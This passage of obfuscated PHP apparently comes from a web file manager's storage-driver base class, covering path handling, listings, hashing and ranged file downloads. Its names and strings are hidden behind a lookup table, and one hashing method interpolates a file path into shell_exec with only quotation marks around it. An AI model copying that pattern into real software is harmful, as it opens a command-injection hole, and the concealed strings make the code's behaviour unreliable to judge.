IO::init($¹ŠşÎ™·); return $»Ğ¦µÇä->path; } public function getPathOuter($Ï’ï¥œ‹) { $¾±‘­ÍŠ =& $_SERVER[ÔÕ±ĞšÎ]; $ô¤¤¡©ó = strlen(trim($this->pathBase, $¾±‘­ÍŠ[8])); $Ï’ï¥œ‹ = substr(trim($Ï’ï¥œ‹, $¾±‘­ÍŠ[8]), $ô¤¤¡©ó); return $this->pathDriver . $¾±‘­ÍŠ[8] . ltrim($Ï’ï¥œ‹, $¾±‘­ÍŠ[8]); } public function isParentOf($‘Ô²¹ªÌ, $şî€‚íµ) { $âùµÉîõ =& $_SERVER[ÔÕ±ĞšÎ]; $‘Ô²¹ªÌ = rtrim(strtolower($‘Ô²¹ªÌ), $âùµÉîõ[8]) . $âùµÉîõ[8]; $şî€‚íµ = rtrim(strtolower($şî€‚íµ), $âùµÉîõ[8]) . $âùµÉîõ[8]; $¡ëîâ£† = strpos($şî€‚íµ, $‘Ô²¹ªÌ) === 0; return $¡ëîâ£†; } public function getType() { $¹šäêù  =& $_SERVER[ÔÕ±ĞšÎ]; $ˆ¿úôŒ“ = str_replace($¹šäêù [77], $¹šäêù [12], get_class($this)); return strtolower($ˆ¿úôŒ“); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Ç„Ó², $†ì¹‚Â) { $à¸íÖ®¦ =& $_SERVER[ÔÕ±ĞšÎ]; $µ÷ë¬“Š = rtrim($Ç„Ó², $à¸íÖ®¦[8]) . $à¸íÖ®¦[8] . $†ì¹‚Â; $Ö°«¶ó˜ = $this->exist($µ÷ë¬“Š); return $Ö°«¶ó˜ ? $µ÷ë¬“Š : !1; } public function setModifyTime($êÔ½‹÷ç, $¸÷Ÿñ» = '') { } public function renameObject($ ßãÕ, $î‡€Ø´³) { $ÆÎñ½Èá = $î‡€Ø´³; $ ßãÕ = $this->getPathOuter($ ßãÕ); $î‡€Ø´³ = $this->pathFather($ ßãÕ) . $î‡€Ø´³; $Ñ‹õ¼ğÂ = IO::copy($ ßãÕ, $this->pathFather($ ßãÕ), REPEAT_RENAME_FOLDER, $ÆÎñ½Èá); if ($Ñ‹õ¼ğÂ) { IO::remove($ ßãÕ); } return $Ñ‹õ¼ğÂ ? $î‡€Ø´³ : !1; } public function tempFile($´ó®ú´Ô = '', $ŒÌÄä®‚ = '') { if (!$´ó®ú´Ô) { $´ó®ú´Ô = rand_string(15); } $€şÑÓ˜€ = TEMP_FILES . rand_string(15) . $_SERVER[ÔÕ±ĞšÎ][8]; @mkdir($€şÑÓ˜€, DEFAULT_PERRMISSIONS, !0); $Öó¾²ş = $€şÑÓ˜€ . $´ó®ú´Ô; @touch($Öó¾²ş); if ($ŒÌÄä®‚) { file_put_contents($Öó¾²ş, $ŒÌÄä®‚); } return $Öó¾²ş; } public function tempFileRemve($É”¨É©) { @unlink($É”¨É©); @rmdir($this->pathFather($É”¨É©)); } public function mkfile($—‘™´ü™, $¡å²ŸÍ = '', $˜æ”“­ö = REPEAT_RENAME) { } public function mkdir($à÷ŞÌ®Ï, $¸ù¸Î§ = REPEAT_SKIP) { } public function delFile($ÂÕ…€) { } public function delFolder($è×ã“Å¦) { } public function copyFile($çÚ³”€›, $øğ„ÔÜÙ) { } public function moveFile($¨×ºÃÓú, $ƒÚõ‰Ñ) { } public function remove($„¶ÂúñÀ) { if ($this->isFile($„¶ÂúñÀ)) { return $this->delFile($„¶ÂúñÀ); } return $this->delFolder($„¶ÂúñÀ); } public function rename($¥ªº”ÑÀ, $ËÛœßœ®) { } public function exist($ü›×ÎÙ) { } public function findByHash($Â«ªÙŠ¢ = '', $ÉîÃ“ñ° = '') { return !1; } public function isFile($Åäş÷õ½) { } public function isFolder($ªŠ£ø½ß) { } public function size($•¯„â•) { } public function info($øë¢÷×) { } public function infoSimple($ğ÷÷û ø) { return $this->info($ğ÷÷û ø); } public function infoAuth($úè›¬•“) { return $this->info($úè›¬•“); } public function infoFull($Â›‡œ·™) { return $this->info($Â›‡œ·™); } public function infoFullSimple($òÔ×„¤å) { return $this->info($òÔ×„¤å); } public function infoWithChildren($É³¥ùûÛ) { $¦ú³ø› =& $_SERVER[ÔÕ±ĞšÎ]; static $õµ×ëÚÔ = array(); if (isset($õµ×ëÚÔ[$É³¥ùûÛ])) { return $õµ×ëÚÔ[$É³¥ùûÛ]; } $ş’œ• ø = $this->info($É³¥ùûÛ); if ($ş’œ• ø && $ş’œ• ø[$¦ú³ø›[33]] == $¦ú³ø›[78]) { $—†»²ö = array($¦ú³ø›[79] => 0, $¦ú³ø›[80] => 0, $¦ú³ø›[81] => 0); $this->infoChildren($É³¥ùûÛ, $—†»²ö); $ş’œ• ø[$¦ú³ø›[79]] = $—†»²ö[$¦ú³ø›[79]]; $ş’œ• ø[$¦ú³ø›[82]] = array($¦ú³ø›[83] => $—†»²ö[$¦ú³ø›[80]], $¦ú³ø›[84] => $—†»²ö[$¦ú³ø›[81]]); $õµ×ëÚÔ[$É³¥ùûÛ] = $ş’œ• ø; } return $ş’œ• ø; } public function listPath($’­–ê°ü, $Îš½ê÷ = false) { } public function has($ú¿¼¨¬«, $÷Ãë¥Ïç = false, $«›¯¤ÌŒ = false) { } public function canRead($é÷—öÛÒ) { } public function canWrite($£Ê†ëÈ…) { } public function getContent($ÒÒ³¨³û) { } public function setContent($Ğ‡‚×, $˜¶¾˜Ê¬ = '') { } protected function infoChildren($Ë†¿ÔÖò, &$°£Û¿‹¨) { $åœ¡¹÷Ğ =& $_SERVER[ÔÕ±ĞšÎ]; check_abort_echo(); $Ñô¹ÓÇ = $this->listPath($Ë†¿ÔÖò, !0); $Ñô¹ÓÇ = array_merge($Ñô¹ÓÇ[$åœ¡¹÷Ğ[85]], $Ñô¹ÓÇ[$åœ¡¹÷Ğ[86]]); foreach ($Ñô¹ÓÇ as $™ùÖÊı’) { if ($™ùÖÊı’[$åœ¡¹÷Ğ[33]] == $åœ¡¹÷Ğ[78]) { $°£Û¿‹¨[$åœ¡¹÷Ğ[81]]++; $¨ëªÎÄ = $this->getPathInner($™ùÖÊı’[$åœ¡¹÷Ğ[87]]); $this->infoChildren($¨ëªÎÄ, $°£Û¿‹¨); } else { $°£Û¿‹¨[$åœ¡¹÷Ğ[80]]++; $°£Û¿‹¨[$åœ¡¹÷Ğ[79]] += $™ùÖÊı’[$åœ¡¹÷Ğ[79]]; } } } public function fileSubstr($©äîÇã, $ÃÙ´èÎ°, $ü’÷õ³”) { } public function listAll($˜Á‘¥—é) { } public function listAllMake($ƒ«Ó˜·ê, &$¼ìò¹ÃÕ) { $ÚÖ©’æŞ =& $_SERVER[ÔÕ±ĞšÎ]; check_abort_echo(); $ªÓì®« = $this->listPath($ƒ«Ó˜·ê, !0); if (!$ªÓì®«) { return; } $´Ø„¥Òğ = array_merge($ªÓì®«[$ÚÖ©’æŞ[85]], $ªÓì®«[$ÚÖ©’æŞ[86]]); foreach ($´Ø„¥Òğ as $Ö€Ê¢¦) { $öººòÈø = $Ö€Ê¢¦[$ÚÖ©’æŞ[33]] == $ÚÖ©’æŞ[78]; $êŞ²¾¸— = array($ÚÖ©’æŞ[87] => $Ö€Ê¢¦[$ÚÖ©’æŞ[87]], $ÚÖ©’æŞ[78] => $öººòÈø); if (isset($Ö€Ê¢¦[$ÚÖ©’æŞ[79]])) { $êŞ²¾¸—[$ÚÖ©’æŞ[79]] = $Ö€Ê¢¦[$ÚÖ©’æŞ[79]]; } if (isset($Ö€Ê¢¦[$ÚÖ©’æŞ[88]])) { $êŞ²¾¸—[$ÚÖ©’æŞ[88]] = $Ö€Ê¢¦[$ÚÖ©’æŞ[88]]; } if (!$öººòÈø) { $¼ìò¹ÃÕ[] = $êŞ²¾¸—; continue; } $¼ìò¹ÃÕ[] = $êŞ²¾¸—; $™ñÆ¶–¡ = $Ö€Ê¢¦[$ÚÖ©’æŞ[87]]; $ì”íï¤ = $this->pathDriver; if (substr($Ö€Ê¢¦[$ÚÖ©’æŞ[87]], 0, strlen($ì”íï¤)) == $ì”íï¤) { $™ñÆ¶–¡ = substr($™ñÆ¶–¡, strlen($ì”íï¤)); } $this->listAllMake($™ñÆ¶–¡, $¼ìò¹ÃÕ); } } public function listAllSimple($¨´Ã‚€Ú, $ä¡½ßó¡ = false) { $Î«î˜É’ = $this->listAll($¨´Ã‚€Ú); return $this->listAllSimpleMake($Î«î˜É’, $this->getPathOuter($¨´Ã‚€Ú), $ä¡½ßó¡); } public function listAllSimpleMake($‹îÈ»ë², $ÀÖ»Ê¯À, $ŠÆÜìö‚) { $†ÙâØ·… =& $_SERVER[ÔÕ±ĞšÎ]; $æüÓ»«’ = array(); $ÀÖ»Ê¯À = rtrim(get_path_father($ÀÖ»Ê¯À), $†ÙâØ·…[8]) . $†ÙâØ·…[8]; foreach ($‹îÈ»ë² as $±çìÇ­ù) { $ı°ñ¬’ = array($†ÙâØ·…[87] => $±çìÇ­ù[$†ÙâØ·…[87]], $†ÙâØ·…[89] => $±çìÇ­ù[$†ÙâØ·…[87]], $†ÙâØ·…[78] => $±çìÇ­ù[$†ÙâØ·…[78]]); if (isset($±çìÇ­ù[$†ÙâØ·…[79]]) && !$±çìÇ­ù[$†ÙâØ·…[78]]) { $ı°ñ¬’[$†ÙâØ·…[79]] = $±çìÇ­ù[$†ÙâØ·…[79]]; } if (isset($±çìÇ­ù[$†ÙâØ·…[88]])) { $ı°ñ¬’[$†ÙâØ·…[88]] = $±çìÇ­ù[$†ÙâØ·…[88]]; } if (is_array($±çìÇ­ù[$†ÙâØ·…[90]])) { $ı°ñ¬’[$†ÙâØ·…[89]] = $±çìÇ­ù[$†ÙâØ·…[90]][$†ÙâØ·…[87]]; $ı°ñ¬’[$†ÙâØ·…[79]] = $±çìÇ­ù[$†ÙâØ·…[90]][$†ÙâØ·…[79]]; $ı°ñ¬’[$†ÙâØ·…[88]] = $±çìÇ­ù[$†ÙâØ·…[90]][$†ÙâØ·…[88]]; } else { if (substr($±çìÇ­ù[$†ÙâØ·…[87]], 0, strlen($ÀÖ»Ê¯À)) == $ÀÖ»Ê¯À) { $ı°ñ¬’[$†ÙâØ·…[87]] = substr($±çìÇ­ù[$†ÙâØ·…[87]], strlen($ÀÖ»Ê¯À)); } } $¦Œ«û´ñ = $±çìÇ­ù[$†ÙâØ·…[78]] ? $†ÙâØ·…[8] : $†ÙâØ·…[12]; $ı°ñ¬’[$†ÙâØ·…[89]] = rtrim($ı°ñ¬’[$†ÙâØ·…[89]], $†ÙâØ·…[8]) . $¦Œ«û´ñ; $ı°ñ¬’[$†ÙâØ·…[87]] = $†ÙâØ·…[8] . trim($ı°ñ¬’[$†ÙâØ·…[87]], $†ÙâØ·…[8]) . $¦Œ«û´ñ; if (!$ŠÆÜìö‚) { $±”ÙšÏ™ = explode($†ÙâØ·…[8], trim($ı°ñ¬’[$†ÙâØ·…[87]], $†ÙâØ·…[8])); $ı°ñ¬’[$†ÙâØ·…[87]] = $†ÙâØ·…[8] . implode($†ÙâØ·…[8], array_slice($±”ÙšÏ™, 1)) . $¦Œ«û´ñ; } $æüÓ»«’[] = $ı°ñ¬’; } return array_sort_by($æüÓ»«’, $†ÙâØ·…[87]); } public function upload($çøÒ¸°ï, $Õ©Õè¹, $¢ÙŒú©± = false, $›ÊÖ‹™× = REPEAT_REPLACE) { } public function uploadFileByID($ÔµÏùÑ‰, $¾ó«Ù˜­, $Í»¼‹Š) { } public function uploadFileByPath($ÆÀ¤ë¸è, $‡ñ±ö½, $Àª‰ü» = array()) { } public function isUploadServer() { $ÖÍœı¼ó =& $_SERVER[ÔÕ±ĞšÎ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ÖÍœı¼ó[91]) { return !0; } return $GLOBALS[$ÖÍœı¼ó[6]][$ÖÍœı¼ó[92]][$ÖÍœı¼ó[93]]; } public function isFileOutServer() { $«÷‰¢Ú =& $_SERVER[ÔÕ±ĞšÎ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $«÷‰¢Ú[91]) { return !0; } return $GLOBALS[$«÷‰¢Ú[6]][$«÷‰¢Ú[92]][$«÷‰¢Ú[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($ĞÈ„Õè„) { $§—Ÿ·’ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$this->isCdnHost()) { return $ĞÈ„Õè„; } return str_replace(trim(get_url_root($ĞÈ„Õè„), $§—Ÿ·’[8]), trim($this->cdnHost, $§—Ÿ·’[8]), $ĞÈ„Õè„); } public function uploadLink($ú±’ğÆø, $®õ†å•Ù = 0) { $Òœˆ¯±‡ =& $_SERVER[ÔÕ±ĞšÎ]; if ($this->isUploadServer()) { return; } $£ö‡¥ „ = $this->getType(); if (!in_array($£ö‡¥ „, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Ñê¥’ = 1024 * 1024 * 10; $€·ˆ é = $®õ†å•Ù <= $Ñê¥’ ? $Òœˆ¯±‡[95] : $Òœˆ¯±‡[96]; $ëÈë×¹È = (!$®õ†å•Ù ? 1 : ceil($®õ†å•Ù / pow(1024, 3))) * 3600 * 4; $óŠÑ¼¶¸ = $this->{$€·ˆ é}($ú±’ğÆø, $ëÈë×¹È); if ($óŠÑ¼¶¸) { $óŠÑ¼¶¸[$Òœˆ¯±‡[97]] = $ú±’ğÆø; $óŠÑ¼¶¸[$Òœˆ¯±‡[98]] = $£ö‡¥ „; } return $óŠÑ¼¶¸; } public function uploadFormData($Í”“”·¬, $²·ã¯æí = 3600) { } public function uploadMultiData($–™ç¿÷µ, $ËïÅÎëÚ = 3600) { } public function multiUploadFormData($ÚÀ¸ŠĞö, $Šîûš± = 3600) { return $this->uploadMultiData($ÚÀ¸ŠĞö, $Šîûš±); } public function download($«ş¤¤´Ğ, $»ÜÈÀş) { } public function ext($û®ÖÅÎ–) { $¨ù‚”× =& $_SERVER[ÔÕ±ĞšÎ]; if (strpos($û®ÖÅÎ–, $¨ù‚”×[8]) === -1) { $ÂûÑ˜  = $û®ÖÅÎ–; } else { $ÂûÑ˜  = $this->pathThis($û®ÖÅÎ–); } $À¥æğÓÄ = $¨ù‚”×[12]; if (strstr($ÂûÑ˜ , $¨ù‚”×[10])) { $À¥æğÓÄ = substr($ÂûÑ˜ , strrpos($ÂûÑ˜ , $¨ù‚”×[10]) + 1); $À¥æğÓÄ = strtolower($À¥æğÓÄ); } if (strlen($À¥æğÓÄ) > 3 && preg_match($¨ù‚”×[99], $À¥æğÓÄ, $ğ²İ³ù)) { $À¥æğÓÄ = $¨ù‚”×[12]; } return $À¥æğÓÄ; } public function pathThis($ÏØİ¢õ–) { $ãã…é¿ =& $_SERVER[ÔÕ±ĞšÎ]; $ÏØİ¢õ– = str_replace($ãã…é¿[100], $ãã…é¿[8], rtrim($ÏØİ¢õ–, $ãã…é¿[8])); $Ì¼ëáñ¾ = strrpos($ÏØİ¢õ–, $ãã…é¿[8]); if ($Ì¼ëáñ¾ === !1) { return $ÏØİ¢õ–; } return substr($ÏØİ¢õ–, $Ì¼ëáñ¾ + 1); } public function pathFather($¥¶äŞó›) { $±òÑ†€Ö =& $_SERVER[ÔÕ±ĞšÎ]; $¥¶äŞó› = str_replace($±òÑ†€Ö[100], $±òÑ†€Ö[8], rtrim($¥¶äŞó›, $±òÑ†€Ö[8])); $ÄÁ±·ÚÍ = strrpos($¥¶äŞó›, $±òÑ†€Ö[8]); if ($ÄÁ±·ÚÍ === !1) { return $±òÑ†€Ö[12]; } return substr($¥¶äŞó›, 0, $ÄÁ±·ÚÍ + 1); } public function hashSimple($æ¥ÛÔÁü) { $§ŞÑû ğ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$æ¥ÛÔÁü) { return md5($§ŞÑû ğ[12]); } $¦™åŒ†Î = $this->size($æ¥ÛÔÁü); $Ø‡€àÍÏ = 200; $ëœé£Ù« = 50; if ($¦™åŒ†Î <= $Ø‡€àÍÏ * $ëœé£Ù«) { return $this->hashMd5($æ¥ÛÔÁü) . $¦™åŒ†Î; } $å÷‰ò = intval($¦™åŒ†Î / $ëœé£Ù«); $éğÌÛìÍ = $§ŞÑû ğ[12]; for ($£ô¾Íãë = 0; $£ô¾Íãë < $ëœé£Ù«; $£ô¾Íãë++) { $éğÌÛìÍ .= $this->fileSubstr($æ¥ÛÔÁü, $å÷‰ò * $£ô¾Íãë, $Ø‡€àÍÏ); } $éğÌÛìÍ .= $this->fileSubstr($æ¥ÛÔÁü, $¦™åŒ†Î - $Ø‡€àÍÏ, $Ø‡€àÍÏ); return md5($éğÌÛìÍ) . $¦™åŒ†Î; } public static $md5Cache = array(); public function hashMd5($´¶ßš±‡) { if (!$´¶ßš±‡) { return md5($_SERVER[ÔÕ±ĞšÎ][12]); } $´¶ßš±‡ = $this->iconvSystem($´¶ßš±‡); if (isset(self::$md5Cache[$´¶ßš±‡])) { return self::$md5Cache[$´¶ßš±‡]; } self::$md5Cache[$´¶ßš±‡] = $this->hashMd5Shell($´¶ßš±‡); if (!self::$md5Cache[$´¶ßš±‡]) { self::$md5Cache[$´¶ßš±‡] = @md5_file($´¶ßš±‡); } return self::$md5Cache[$´¶ßš±‡]; } private function hashMd5Shell($»Ÿß®‘¹) { $©ŠìÏ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$»Ÿß®‘¹) { return md5($©ŠìÏ[12]); } if (!function_exists($©ŠìÏ[101])) { return !1; } $’…†©‘ = array($©ŠìÏ[102], $©ŠìÏ[103]); $Ãáç×‘¬ = Cache::get($©ŠìÏ[104]); if (!$Ãáç×‘¬) { $«™ÂÀ¬ = BASIC_PATH . $©ŠìÏ[105]; $ó± ¶×ê = md5_file($«™ÂÀ¬); $Ãáç×‘¬ = $©ŠìÏ[106]; foreach ($’…†©‘ as $èœ˜Ç¨‹) { $Ÿ„Ğ«à† = shell_exec($èœ˜Ç¨‹ . "\x20\x22{$«™ÂÀ¬}\x22"); if ($Ÿ„Ğ«à† && substr(trim($Ÿ„Ğ«à†), 0, 32) == $ó± ¶×ê) { $Ãáç×‘¬ = $èœ˜Ç¨‹; break; } } Cache::set($©ŠìÏ[104], $Ãáç×‘¬, 3600); } if ($Ãáç×‘¬ == $©ŠìÏ[106]) { return !1; } $Ÿ„Ğ«à† = shell_exec($Ãáç×‘¬ . "\40\x22{$»Ÿß®‘¹}\42"); $Ÿ„Ğ«à† = str_replace($©ŠìÏ[107], $©ŠìÏ[12], $Ÿ„Ğ«à†); return substr($Ÿ„Ğ«à†, 0, 32); } public function link($•Œ¤´¯) { return $•Œ¤´¯; } public function fileOut($‰½³ÍŸ¡, $Òœºšå = false, $şÖ‡¦ÏÆ = false, $İ¹šß÷´ = '') { $—®½İ =& $_SERVER[ÔÕ±ĞšÎ]; $this->cacheMethod(null, null); if (!$‰½³ÍŸ¡ || !$this->exist($‰½³ÍŸ¡)) { show_json(LNG($—®½İ[108]), !1, $şÖ‡¦ÏÆ); } $ŒáÏû = $this->getType() == $—®½İ[109]; $ŞŒÎÀø¤ = $GLOBALS[$—®½İ[6]][$—®½İ[92]][$—®½İ[110]][$—®½İ[111]]; $ ˜¬¦ñ» = (double) $GLOBALS[$—®½İ[6]][$—®½İ[92]][$—®½İ[110]][$—®½İ[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $åšÓÍú = $this->infoFull($‰½³ÍŸ¡); $œõ¡¶¾© = $åšÓÍú[$—®½İ[79]]; $¼†±ŠÎ = gmdate($—®½İ[113], $åšÓÍú[$—®½İ[88]]); $‰­‘— Î = $şÖ‡¦ÏÆ ? $şÖ‡¦ÏÆ : $this->iconvApp($åšÓÍú[$—®½İ[32]]); $‡ÒÌ§« = 0; $ëÀÀ¼éà = $œõ¡¶¾© - 1; $§³Åş¹Æ = $this->ext($‰­‘— Î); if (in_array($§³Åş¹Æ, array($—®½İ[114], $—®½İ[115], $—®½İ[116], $—®½İ[117]))) { $§³Åş¹Æ = $—®½İ[118]; } if (in_array($§³Åş¹Æ, array($—®½İ[119]))) { $§³Åş¹Æ = $—®½İ[120]; } if (!$İ¹šß÷´) { $İ¹šß÷´ = md5($¼†±ŠÎ . $œõ¡¶¾©); } $İ¹šß÷´ = $—®½İ[121] . $İ¹šß÷´ . $—®½İ[121]; $„ŒÚêîó = get_file_mime($§³Åş¹Æ); $œîÄşõû = !0; $œîÄşõû = isset($_GET[$—®½İ[122]]) ? !1 : !0; if ($Òœºšå === !1 && !mime_support($„ŒÚêîó)) { $„ŒÚêîó = $—®½İ[123]; } header($—®½İ[124]); header($—®½İ[125] . $„ŒÚêîó); $ÍÙêô©õ = rawurlencode($‰­‘— Î); $ÍÙêô©õ = $—®½İ[121] . $ÍÙêô©õ . $—®½İ[126] . $ÍÙêô©õ; if ($Òœºšå) { header($—®½İ[127]); header($—®½İ[128] . $ÍÙêô©õ); } else { if ($œîÄşõû) { header($—®½İ[129] . $ÍÙêô©õ); } } $Î§³ÚÜ = 3600 * 24 * 30; header($—®½İ[130]); header($—®½İ[131]); header($—®½İ[132] . $Î§³ÚÜ); header($—®½İ[133] . gmdate($—®½İ[113], time() + $Î§³ÚÜ) . $—®½İ[134]); if (isset($_SERVER[$—®½İ[135]]) && strtotime($_SERVER[$—®½İ[135]]) == $åšÓÍú[$—®½İ[88]]) { header($—®½İ[136], !0, 304); die; } if (isset($_SERVER[$—®½İ[137]]) && $_SERVER[$—®½İ[137]] == $İ¹šß÷´) { header($—®½İ[138] . $İ¹šß÷´, !0, 304); die; } header($—®½İ[138] . $İ¹šß÷´); header($—®½İ[139] . $¼†±ŠÎ . $—®½İ[134]); header($—®½İ[140] . $‰­‘— Î); header($—®½İ[141]); header($—®½İ[142] . $œõ¡¶¾©); header($—®½İ[143]); Hook::trigger($—®½İ[144], $‰½³ÍŸ¡, $œõ¡¶¾©, $‰­‘— Î, $§³Åş¹Æ); if (!$Òœºšå && $§³Åş¹Æ == $—®½İ[145]) { if ($œõ¡¶¾© > 1024 * 1024 * 5) { die; } $Ê¹®³“ = $this->getContent($‰½³ÍŸ¡); $Ê¹®³“ = Html::clearSVG($Ê¹®³“); header($—®½İ[146] . strlen($Ê¹®³“)); echo $Ê¹®³“; die; } $¨ª°Êáû = strtolower($_SERVER[$—®½İ[147]]); if ($ŒáÏû && $¨ª°Êáû && $ŞŒÎÀø¤) { if (strstr($¨ª°Êáû, $—®½İ[148])) { header($—®½İ[149] . $‰½³ÍŸ¡); } else { if (strstr($¨ª°Êáû, $—®½İ[150])) { header($—®½İ[151] . $‰½³ÍŸ¡); } else { if (strstr($¨ª°Êáû, $—®½İ[152])) { header($—®½İ[153] . $‰½³ÍŸ¡); } } } if ($ ˜¬¦ñ») { header($—®½İ[154] . $ ˜¬¦ñ»); } return; } if (isset($_SERVER[$—®½İ[155]])) { if (preg_match($—®½İ[156], $_SERVER[$—®½İ[155]], $äïèÚ±±)) { $‡ÒÌ§« = intval($äïèÚ±±[1]); $‡ÒÌ§« = $‡ÒÌ§« <= 0 ? 0 : ($‡ÒÌ§« >= $ëÀÀ¼éà ? $ëÀÀ¼éà : $‡ÒÌ§«); if (!empty($äïèÚ±±[2])) { $àÛîÍåª = intval($äïèÚ±±[2]); $ëÀÀ¼éà = $àÛîÍåª < $‡ÒÌ§« ? $‡ÒÌ§« : ($àÛîÍåª >= $ëÀÀ¼éà ? $ëÀÀ¼éà : $àÛîÍåª); } } header($—®½İ[157]); header("\x43\157\x6e\164\145\156\164\x2d\x52\141\156\x67\x65\72\x20\142\x79\164\x65\163\x20{$‡ÒÌ§«}\x2d{$ëÀÀ¼éà}\57" . $œõ¡¶¾©); } else { header($—®½İ[158]); } header($—®½İ[159]); header($—®½İ[160]); $´‰¡­Ø = !0; if ($_SERVER[$—®½İ[161]] == $—®½İ[162] && $œõ¡¶¾© > 1204 * 1024 * 1024 * 2) { $´‰¡­Ø = !1; } if ($´‰¡­Ø) { header($—®½İ[163] . ($ëÀÀ¼éà - $‡ÒÌ§« + 1)); } if ($_SERVER[$—®½İ[164]] == $—®½İ[165]) { return; } $œÖ‘÷Í = array($—®½İ[166] => !1, $—®½İ[167] => $‡ÒÌ§«, $—®½İ[168] => $ëÀÀ¼éà, $—®½İ[169] => $§³Åş¹Æ, $—®½İ[170] => $åšÓÍú, $—®½İ[171] => $—®½İ[12], $—®½İ[172] => 0); $œÖ‘÷Í = Hook::filter($—®½İ[173], $œÖ‘÷Í); $ú¸â‚«‰ = 1024 * 300; $º¨Øçø = 0; if ($ ˜¬¦ñ») { $º¨Øçø = intval(1000 * 1000 * ($ú¸â‚«‰ / $ ˜¬¦ñ»)); } while ($‡ÒÌ§« <= $ëÀÀ¼éà) { $ßŒò•– = timeFloat(); check_abort(); $—”·øş‡ = $ëÀÀ¼éà - $‡ÒÌ§« + 1; if ($—”·øş‡ <= $ú¸â‚«‰) { $ú¸â‚«‰ = $—”·øş‡; } $Ê¹®³“ = $this->fileSubstr($‰½³ÍŸ¡, $‡ÒÌ§«, $ú¸â‚«‰); if ($œÖ‘÷Í[$—®½İ[166]]) { $œÖ‘÷Í[$—®½İ[171]] = $Ê¹®³“; $œÖ‘÷Í[$—®½İ[172]] = $‡ÒÌ§«; $œÖ‘÷Í = Hook::filter($—®½İ[174], $œÖ‘÷Í); $Ê¹®³“ = $œÖ‘÷Í[$—®½İ[171]]; } echo $Ê¹®³“; $‡ÒÌ§« += $ú¸â‚«‰; if ($ú¸â‚«‰ == $—”·øş‡) { $‡ÒÌ§« = $ëÀÀ¼éà + 1; } if ($º¨Øçø) { $¶±àëî = intval(1000 * 1000 * (timeFloat() - $ßŒò•–)); $šä­ü³ñ = $º¨Øçø - $¶±àëî; if ($šä­ü³ñ > 5) { usleep($šä­ü³ñ); } } } } public function fileOutServer($˜Üó³·¬, $Î­„Ï±í = false, $¬«ïñÈÛ = false, $ŒƒÕ¡ÎÅ = '') { $this->fileOut($˜Üó³·¬, $Î­„Ï±í, $¬«ïñÈÛ, $ŒƒÕ¡ÎÅ); } public function fileOutLink($Üõ®ÂÑ—) { header($_SERVER[ÔÕ±ĞšÎ][175] . $Üõ®ÂÑ—); die; } public function cacheMethod($ ÓÒï, $“î¢›ßÚ, $ğäÍ´ÌŠ = null) { $Îµ¬Û›à =& $_SERVER[ÔÕ±ĞšÎ]; static $Ûê»ç±á = array(); $³ò™á™ = $“î¢›ßÚ ? ltrim($this->getPathOuter($“î¢›ßÚ), $Îµ¬Û›à[8]) : $Îµ¬Û›à[12]; $Ê¥Å…ô° = $Îµ¬Û›à[176] . $ ÓÒï . $Îµ¬Û›à[177] . rtrim($³ò™á™, $Îµ¬Û›à[8]); if (is_null($ ÓÒï)) { $Ûê»ç±á = array(); return; } if (is_null($“î¢›ßÚ)) { foreach ($Ûê»ç±á as $Ê¥Å…ô° => $µÜ›Ğ˜Ñ) { if (!strstr($Ê¥Å…ô°, $Îµ¬Û›à[176] . $ ÓÒï . $Îµ¬Û›à[178])) { continue; } unset($Ûê»ç±á[$Ê¥Å…ô°]); } return; } if (!is_null($ğäÍ´ÌŠ)) { $Ûê»ç±á[$Ê¥Å…ô°] = $ğäÍ´ÌŠ; return; } $îĞÍâ¢Ù = isset($Ûê»ç±á[$Ê¥Å…ô°]) ? $Ûê»ç±á[$Ê¥Å…ô°] : null; if (!is_null($îĞÍâ¢Ù)) { return $îĞÍâ¢Ù; } $îĞÍâ¢Ù = $this->{$ ÓÒï}($“î¢›ßÚ); $Ûê»ç±á[$Ê¥Å…ô°] = $îĞÍâ¢Ù; return $îĞÍâ¢Ù; } public function cacheMethodInfoSet($ÍÚ–ŞÙ–, $€Çåä…, $Éªœåºò = false) { $ŞğùŞÄ½ =& $_SERVER[ÔÕ±ĞšÎ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ŞğùŞÄ½[179], $ÍÚ–ŞÙ–, $€Çåä…); $this->cacheMethod($ŞğùŞÄ½[180], $ÍÚ–ŞÙ–, $€Çåä… ? !1 : !0); if (is_array($Éªœåºò)) { $this->cacheMethod($ŞğùŞÄ½[181], $ÍÚ–ŞÙ–, $Éªœåºò); } } public function fileOutImage($îà¯¬“’, $ÛÕ€ø¦¢ = 250) { $—ì¯“ìö =& $_SERVER[ÔÕ±ĞšÎ]; set_timeout(); if (substr($îà¯¬“’, 0, 4) == $—ì¯“ìö[152]) { $this->fileOutLink($îà¯¬“’); } $×ÍİÚú = $this->info($îà¯¬“’); $¨ˆŠÉÆ“ = !1; $åÂ‘ÁÎı = isset($GLOBALS[$—ì¯“ìö[182]]) ? $GLOBALS[$—ì¯“ìö[182]] : array(); if ($åÂ‘ÁÎı && $åÂ‘ÁÎı[$—ì¯“ìö[183]] == $×ÍİÚú[$—ì¯“ìö[87]]) { $×ÍİÚú = $åÂ‘ÁÎı; $şÂ‚›ëû = $×ÍİÚú[$—ì¯“ìö[184]]; if ($şÂ‚›ëû && isset($şÂ‚›ëû[$—ì¯“ìö[185]])) { if ($şÂ‚›ëû[$—ì¯“ìö[185]] <= $ÛÕ€ø¦¢ && $şÂ‚›ëû[$—ì¯“ìö[186]] <= $ÛÕ€ø¦¢) { $¨ˆŠÉÆ“ = !0; } } } if ($×ÍİÚú[$—ì¯“ìö[79]] <= 1024 * 50 || $¨ˆŠÉÆ“ || !function_exists($—ì¯“ìö[187]) || $×ÍİÚú[$—ì¯“ìö[169]] == $—ì¯“ìö[188]) { return $this->fileOut($îà¯¬“’, !1, $×ÍİÚú[$—ì¯“ìö[32]]); } $…¯¬ôÌİ = kodIO::hashPath($×ÍİÚú); $Ğ™øœ £ = 